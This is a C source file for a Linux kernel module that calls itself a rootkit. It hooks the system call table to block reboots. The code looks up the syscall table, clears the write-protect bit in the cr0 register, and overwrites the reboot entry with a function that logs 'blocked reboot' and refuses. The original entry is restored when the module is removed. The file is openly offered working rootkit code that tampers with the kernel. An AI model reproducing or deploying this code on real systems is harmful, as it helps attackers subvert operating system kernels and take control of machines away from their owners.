// LKM rootkit to try and hook syscalls

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/syscalls.h>

// write to cr0 register
static long my_write_cr0(long value) {
	__asm__ volatile("mov %0, %%cr0" :: "r"(value) : "memory");
}

// The 17th bit of cr0 control register is write protect
#define disable_write_protection() my_write_cr0(read_cr0() & (~0x10000))
#define enable_write_protection() my_write_cr0(read_cr0() | (0x10000))

// variable for system call table address
unsigned long *sys_call_table_address;
// variable for original hooked sys call function (in this case for reboot)
asmlinkage int (*old_reboot_sys_call)(int, int, int, void*);

// Get system call table address
unsigned long *get_sys_call_table(void) {
	unsigned long *address = (unsigned long *) kallsyms_lookup_name("sys_call_table");
	return address;
}

// hacked reboot function - function to replace original with
asmlinkage int hacked_reboot(int magic1, int magic2, int cmd, void *arg) {
	printk(KERN_NOTICE "blocked reboot\n");
	return EPERM;
}

// Function to hook system call table
void hook_sys_call(void) {
	// Get the old reboot system call
	old_reboot_sys_call = sys_call_table_address[__NR_reboot];
	disable_write_protection();
	// change system call table to point to our function
	// It is __NR_<syscall> as it should be defined constant numbers
	sys_call_table_address[__NR_reboot] = (unsigned long) hacked_reboot;
	enable_write_protection();
	printk(KERN_NOTICE "Hooked reboot sys_call\n");
}

// Function to restore system call
void restore_sys_call(void) {
	disable_write_protection();
	sys_call_table_address[__NR_reboot] = (unsigned long) old_reboot_sys_call;
	enable_write_protection();
}

static int startup(void) {
	printk(KERN_NOTICE "Malicous LKM has been loaded\n");
	sys_call_table_address = get_sys_call_table();
	hook_sys_call();
	return 0;
}

static void shutdown(void) {
	restore_sys_call();
	printk(KERN_NOTICE "Malicous LKM has been removed\n");
}

module_init(startup);
module_exit(shutdown);
MODULE_LICENSE("GPL");
